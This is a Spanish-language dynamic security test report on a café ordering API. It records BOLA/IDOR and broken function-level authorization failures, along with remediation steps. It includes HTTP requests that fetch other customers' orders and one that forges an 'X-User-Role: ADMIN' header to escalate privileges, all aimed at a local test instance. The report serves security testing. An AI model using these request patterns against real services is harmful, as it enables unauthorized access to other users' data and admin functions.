# SEC-CASE-02 — Autorización y Control de Acceso
## Reporte DAST (Dynamic Application Security Testing) — Estado A (Baseline)

**Metodología:** OWASP Web Security Testing Guide (WSTG v4.2) / OWASP API Security Top 10 2023  
**Fecha:** 2026-10-15  
**Objetivo:** Evaluar dinámicamente el aislamiento de recursos entre usuarios (BOLA/IDOR) y el mecanismo de verificación de roles administrativos.  
**Resultado global Estado A:** ❌ **FAIL** (Confirmación de BOLA/IDOR transversal y escalamiento de privilegios vía cabecera HTTP)

---

## 1. Resumen Ejecutivo de Pruebas Dinámicas

| ID Prueba DAST | Requisito | OWASP API 2023 | Endpoint Objetivo | Aserción de Seguridad Esperada (Estado B) | Comportamiento Observado (Estado A) | Resultado |
|---|---|---|---|---|---|:---:|
| **DAST-02-01** | SEC-REQ-004 | API1:2023 (BOLA) | `GET /api/orders` | Retorna únicamente órdenes del usuario del token | Retorna todas las órdenes del sistema de todos los clientes | ❌ **FAIL** |
| **DAST-02-02** | SEC-REQ-004 | API1:2023 (BOLA) | `GET /api/orders/{id}` | `403 Forbidden` o `404 Not Found` al consultar orden ajena | `200 OK` retornando orden de Cliente B con token de Cliente A | ❌ **FAIL** |
| **DAST-02-03** | SEC-REQ-004 | API1:2023 (BOLA) | `GET /api/orders/{id}/enriched` | `403 Forbidden` al solicitar orden ajena enriquecida | `200 OK` con datos completos y productos de orden ajena | ❌ **FAIL** |
| **DAST-02-04** | SEC-REQ-005 | API5:2023 (BFLA) | `POST /api/catalog/products` | `403 Forbidden` si el rol en el JWT es `CLIENTE` | `201 Created` al enviar cabecera `X-User-Role: ADMIN` | ❌ **FAIL** |
| **DAST-02-05** | SEC-REQ-005 | API5:2023 (BFLA) | `PUT /api/orders/{id}/status` | `403 Forbidden` para usuarios regulares | `200 OK` actualizando estado mediante `X-User-Role: ADMIN` | ❌ **FAIL** |

---

## 2. Detalle de Pruebas Dinámicas y Evidencias

---

### Prueba DAST-02-01: BOLA en Listado Global de Órdenes (`GET /api/orders`)

#### 1. Objetivo y Alcance
Verificar si un usuario autenticado puede visualizar órdenes de compra pertenecientes a otros clientes.
- **Referencia:** OWASP API1:2023 – Broken Object Level Authorization (BOLA).
- **Código:** `api_cloud/src/main/java/cl/duoc/api/OrdersController.java:90`, `ms-pedidos360-orders/.../OrderServiceImpl.java:119`.

#### 2. Transacción HTTP Dinámica

**Petición enviada con credenciales de `cliente1@cafe.test`:**
```http
GET /api/orders HTTP/1.1
Host: 127.0.0.1:8088
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJDTElFTlRFXzEiLCJlbWFpbCI6ImNsaWVudGUxQGNhZmUudGVzdCIsInJvbGUiOiJDTElFTlRFIn0...
Accept: application/json
```

**Respuesta recibida en Estado A:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

[
  {
    "id": "e4a1a56e-8e6b-4e6a-bf0c-83b380695001",
    "clienteId": "550e8400-e29b-41d4-a716-446655440001",
    "nombre": "Cliente Uno",
    "total": 12500.00
  },
  {
    "id": "f8b2c67f-9f7c-4f7b-cf1d-94c491706002",
    "clienteId": "660e9511-f30c-52e5-b827-557766551112",
    "nombre": "Cliente Dos (Víctima)",
    "total": 45000.00
  }
]
```

#### 3. Análisis de Aserción
- **Aserción:** Todo objeto retornado debe tener `clienteId == sub_del_jwt`.
- **Resultado:** La llamada retorna todas las órdenes persistidas en el sistema (ejecuta `orderRepository.findAll()`). Un cliente regular accede a transacciones comerciales ajenas.
- **Dictamen:** ❌ **FAIL**.

---

### Prueba DAST-02-02: BOLA / IDOR en Detalle de Orden (`GET /api/orders/{id}`)

#### 1. Transacción HTTP Dinámica

**Petición enviada por Cliente 1 consultando ID perteneciente a Cliente 2:**
```http
GET /api/orders/f8b2c67f-9f7c-4f7b-cf1d-94c491706002 HTTP/1.1
Host: 127.0.0.1:8088
Authorization: Bearer <TOKEN_CLIENTE_1>
```

**Respuesta recibida en Estado A:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "f8b2c67f-9f7c-4f7b-cf1d-94c491706002",
  "clienteId": "660e9511-f30c-52e5-b827-557766551112",
  "nombre": "Cliente Dos",
  "correo": "cliente2@cafe.test",
  "estado": "CREADO",
  "total": 45000.00
}
```

#### 2. Análisis de Aserción
- **Aserción:** Debe retornar `403 Forbidden` si la orden no pertenece al usuario autenticado.
- **Resultado:** Retorna `200 OK`. No hay validación de propiedad ni en el BFF ni en `OrderServiceImpl.java:82`.
- **Dictamen:** ❌ **FAIL**.

---

### Prueba DAST-02-04: Escalamiento de Privilegios mediante Cabecera `X-User-Role: ADMIN`

#### 1. Objetivo y Alcance
Evaluar si la autorización para crear productos en el catálogo (`POST /api/catalog/products`) se basa en una cabecera HTTP inyectable por el cliente en vez del token criptográfico.
- **Referencia:** OWASP API5:2023 – Broken Function Level Authorization.
- **Código:** `api_cloud/src/main/java/cl/duoc/api/auth/RoleHeaderFilter.java:27`.

#### 2. Transacción HTTP Dinámica

**Petición con token de `CLIENTE`, inyectando cabecera administrativa:**
```http
POST /api/catalog/products HTTP/1.1
Host: 127.0.0.1:8088
Authorization: Bearer <TOKEN_DE_ROL_CLIENTE>
X-User-Role: ADMIN
Content-Type: application/json

{
  "name": "Café Ilegítimo Creado por Cliente",
  "description": "Producto creado saltándose el control de roles",
  "price": 990.00,
  "stock": 500
}
```

**Respuesta recibida en Estado A:**
```http
HTTP/1.1 201 Created
Content-Type: application/json
Location: /api/catalog/products/a1b2c3d4-e5f6-7890-abcd-ef1234567890

{
  "id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
  "name": "Café Ilegítimo Creado por Cliente",
  "price": 990.00,
  "stock": 500
}
```

#### 3. Análisis de Aserción
- **Aserción:** La petición debe ser rechazada con `403 Forbidden` porque el JWT contiene `"role": "CLIENTE"`.
- **Resultado:** `RoleHeaderFilter` lee exclusivamente `request.getHeader("X-User-Role")`. Al recibir el valor `"ADMIN"` desde el cliente, permite el paso hacia el backend, permitiendo a cualquier cliente realizar funciones de administración.
- **Dictamen:** ❌ **FAIL**.

---

## 3. Matriz de Hallazgos y Remediación (Hacia Estado B)

| Hallazgo Dinámico | Vulnerabilidad | Remediación en Estado B |
|---|---|---|
| DAST-02-01 / 02 / 03 | BOLA / IDOR en Órdenes | En `OrderServiceImpl`, filtrar consultas por `usuarioAutenticadoId` extraído del SecurityContext; rechazar con `403` si `order.clienteId != currentUserId`. |
| DAST-02-04 / 05 | Escalamiento vía `X-User-Role` | Eliminar `RoleHeaderFilter`. Extraer authorities (`ROLE_ADMIN`) directamente de los claims firmados del JWT en Spring Security. |

---

*Reporte generado como parte de Fase VII – Security Testing, Etapa DAST.*  
*Especificaciones dinámicas disponibles en:* `Evidences/SEC-CASE-02/DAST/CASE02-EV002-dast-specs.json`
